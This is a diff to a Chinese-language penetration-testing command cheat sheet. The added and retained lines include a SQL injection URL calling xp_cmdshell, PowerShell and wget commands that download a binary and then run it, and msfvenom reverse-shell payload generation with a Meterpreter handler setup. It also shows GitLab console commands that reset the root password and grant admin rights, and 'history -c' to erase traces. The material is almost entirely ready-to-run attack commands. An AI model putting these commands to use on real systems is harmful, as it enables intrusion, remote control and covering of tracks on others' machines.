@@ -1,7 +1,6 @@
 # command
 收集渗透中会用到的常用命令  。
 
-更新时间：2022.6.23
 
 
 建议直接[Ctrl+F]查找    
@@ -626,6 +625,38 @@ python sqlmap.py -r "c:\request.txt" -p id –dbms mysql –file-read="e:\www\as
 http://www.vuln.cn/post.php?id=11;DECLARE/**/@ljbd/**/VARCHAR(8000);SET/**/@ljbd=0x70696e67202d6e6320312077772e36373332396163312e646e732e313433332e65752e6f7267;EXEC/**/master..xp_cmdshell/**/@ljbd--
 ```
 
+## gitlab相关
+进入控制台
+
+```
+gitlab-rails console production
+如果没配置环境变量，cd到安装目录下
+
+/bin/rails console production
+
+如果报错可用
+./rails console -e production
+```
+修改密码
+```
+通过用户名查找，赋值给user
+user = User.where(username:"root").first
+
+修改密码
+user.password = "abc123"
+user.password_confirmation= "abc123"
+user.save!
+```
+把用户设为admin
+```
+通过用户名查找，赋值给user
+user = User.where(username:"test").first
+user.admin=ture
+user.save!
+```
+新增用户参考：https://gist.github.com/tacettin/8182358
+
+
 
 ## 找可写目录
 ```
@@ -714,13 +745,23 @@ powershell Get-ChildItem C:
 
 ## python交互shell
 
+py3
+
 ```
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
+py2
 ```
 python2 -c 'import pty;pty.spawn("/bin/sh")'
+
+python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+用完记得清记录
+```
+history -c
+```
+
 
 ## 无交互添加用户
 
@@ -1000,6 +1041,7 @@ PROGRA~2
 ```
 powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','C:\test\1.exe');start-process 'C:\test\1.exe'
 ```
+常用
 ```
 powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','1.exe')
 ```
@@ -1021,14 +1063,14 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText
 ```
-解码
+base64解码
 ```
 $EncodedText = "dwByAGkAxxxxxxxxxxxxxxxxxxxAG0AbgB0AG4AJwA="
 $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
 $DecodedText
 
 ```
-运行base64编码的命令
+运行base64编码后的命令
 ```
 powershell -noP -sta -enc xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
@@ -1097,6 +1139,27 @@ Certutil | Certutil –urlcache –f –split url
 
 ```
 bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
+```
+
+## wget 下载文件
+下载到指定目录
+```
+wget -P /tmp http://127.0.0.1:8088/aliyun
+```
+
+## curl 下载
+使用内置option：-o(小写)
+```
+curl -o dodo1.jpg http:www.linux.com/dodo1.JPG
+```
+使用内置option：-O（大写)
+```
+curl -O http://www.linux.com/dodo1.JPG
+```
+
+下载后，上线
+```
+chmod +x /tmp/aliyun&&/tmp/aliyun
 ```
 
 
@@ -1544,46 +1607,46 @@ Linux
 
 ```bash
 反向连接：
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f elf > shell.elf
 正向连接：
-msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=<Target IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=808 -f elf > shell.elf
 ```
 
 Windows
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f exe > shell.exe
 ```
 
 Mac
 
 ```bash
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f macho > shell.macho
 ```
 
 PHP
 
 ```bash
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
 
 ASP
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f asp > shell.asp
 ```
 
 JSP
 
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f raw > shell.jsp
 ```
 
 WAR
 
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f war > shell.war
 ```
 
 执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：
@@ -1597,19 +1660,19 @@ php shell.php
 Python
 
 ```bash
-msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
+msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=808 -f raw > shell.py
 ```
 
 Bash
 
 ```bash
-msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+msfvenom -p cmd/unix/reverse_bash LHOST=127.0.0.1 LPORT=808 -f raw > shell.sh
 ```
 
 Perl
 
 ```bash
-msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
+msfvenom -p cmd/unix/reverse_perl LHOST=127.0.0.1 LPORT=808 -f raw > shell.pl
 ```
 
 执行方式：复制shell.py中的内容在linux命令行下执行：
@@ -1622,19 +1685,19 @@ python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTI
 Linux Based Shellcode
 
 ```bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f <language>
 ```
 
 Windows Based Shellcode
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=808 -f <language>
 ```
 
 Mac Based Shellcode
 
 ```bash
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=808 -f <language>
 ```
 
 ## Meterpreter基本命令
@@ -1644,7 +1707,9 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port t
 ```bash
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.81.160
+#set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set lPORT 6789
 set ExitOnSession false
 exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)
 jobs  # 查看后台攻击任务 
